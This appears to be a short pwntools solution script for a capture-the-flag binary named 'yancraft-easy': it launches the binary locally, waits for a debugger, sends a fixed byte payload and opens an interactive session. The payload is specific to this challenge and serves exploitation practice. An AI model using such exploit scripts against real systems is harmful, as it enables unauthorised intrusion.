#!/usr/bin/env python3
from pwn import *

p = process("./yancraft-easy")
input(f"attach gdb {p.pid}")

payload  = b'\x20\x02\x40'
payload += b'\x20\x20\x04'
payload += b'\x20\x04\x40'
payload += b'\x20\x10\x04'
payload += b'\xaa\xaa\xaa'

p.send(payload)

p.interactive()
